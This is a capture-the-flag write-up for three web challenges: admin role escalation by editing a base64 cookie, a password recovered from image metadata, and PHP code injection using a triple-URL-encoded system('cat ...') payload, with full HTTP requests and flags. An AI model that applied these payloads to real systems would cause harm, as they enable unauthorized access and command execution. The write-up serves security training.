# STS Cyber Challenge 2023 Write-up

## Web 

### Task - Myktybek  

We see that the data is transmitted via cookie in base64 format.

Try to change role to `admin` and send request.

    {"username":"Myktybek","email":"myktybek@moshnyi.bala","role":"admin"}

Encode it to Base64

    eyJ1c2VybmFtZSI6Ik15a3R5YmVrIiwiZW1haWwiOiJteWt0eWJla0Btb3NobnlpLmJhbGEiLCJyb2xlIjoiYWRtaW4ifQ==

Request:

    GET / HTTP/1.1
    Host: 172.17.0.1:8082
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Accept:
    text/html,application/xhtml+xml,application/xml;q=0.9,ima ge/avif,image/webp,image/apng, */*;q=0.8,application/signe d-exchange; v=b3;q=0.7
    Accept-Encoding: gzip, deflate 
    Accept-Language: en-US, en; q-0.9
    Cookie: user_data-
    eyJ1c2VybmFtZSI6Ik15a3R5YmVrIiwiZW1haWwiOiJteWt0eWJla0Btb3NobnlpLmJhbGEiLCJyb2xlIjoiYWRtaW4ifQ%3d%3d
    Connection: close

![image](https://github.com/user-attachments/assets/ee83fa8c-3ae7-4f00-b4f2-2fa144e546cb)

FLAG 

    STS{th1s_fl4g_1s_e4sy}

### Task - Entrance

We can see the authorization page and a picture in the background.

Download the image and check for meta data.

You can use `exiftool`

`exiftool filename.png`

![image](https://github.com/user-attachments/assets/946ab524-7221-4d4f-ab9c-1cc16189518a)

Password: `U2Qqw26nKfzt2FTTc4xKGp4M5Md3Ch`

You can login with this password and see the flag!
    
![UchihaItachi](https://github.com/user-attachments/assets/2720ac06-cf09-42db-9bef-6d0a9a7eaf11)

FLAG:

    STS{L0g1n3d_Successfull_001}

### Task - Calculator

    POST /calculate.php HTTP/1.1
    Host: 172.17.0.1:8081
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv: 109.0)
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif.image/webp.*/*;q=0.8
    Accept-Language: en-US,en:q-0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 213
    Origin: http://172.17.0.1:8081
    Connection: close
    Referer: http://172.17.0.1:8081/
    Upgrade-Insecure-Requests: 1
    
    expression-
    system%252528%252527cat%252520%25252Fvar%25252Fwww%25252Fhtml%25252F%25252F%25252F%25252F%25252Fflag%25255F833d4eb913a86511905cc51ae5197f679bf1f8debf4292ef2789529d9a8f015e%25252Etxt%252527%252529%252538

Triple Url encoding

    system('cat /var/www/html/////flag_833d4eb913a86511905cc51ae5197f679bf1f8debf4292ef2789529d9a8f015e.txt')


FLAG: 

    STS{RC3_D0UBLE_3nC0d1NG_GJ}
